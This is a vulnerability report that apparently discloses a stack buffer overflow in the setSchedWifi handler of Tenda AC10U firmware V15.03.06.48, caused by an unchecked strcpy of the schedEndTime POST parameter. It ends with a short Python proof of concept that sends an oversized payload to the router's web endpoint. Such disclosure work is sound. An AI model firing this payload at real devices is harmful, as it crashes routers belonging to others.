## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3170.html

## Affected version

AC10U v1.0 Firmware V15.03.06.48

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.48 firmware has a stack overflow vulnerability in the `setSchedWifi` function. The `sched_end_time` variable receives the `schedEndTime` parameter from a POST request and is later assigned to the `wlan_switch` variable, which is fixed at 25 bytes. However, since the user can control the input of `schedEndTime`, the statement `strcpy(wlan_switch->end_time, sched_end_time);` can cause a buffer overflow. The user-provided `schedEndTime` can exceed the capacity of the `wlan_switch` array, triggering this security vulnerability.

![image-20240313152429855](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313152429855.png)

![image-20240313152704805](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313152704805.png)

![image-20240313152724165](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313152724165.png)

## PoC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/openSchedWifi"
payload = b"a"*1000

data = {"schedWifiEnable":0,"schedEndTime": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240313183332634](C:\Users\杨浩然\AppData\Roaming\Typora\typora-user-images\image-20240313183332634.png)
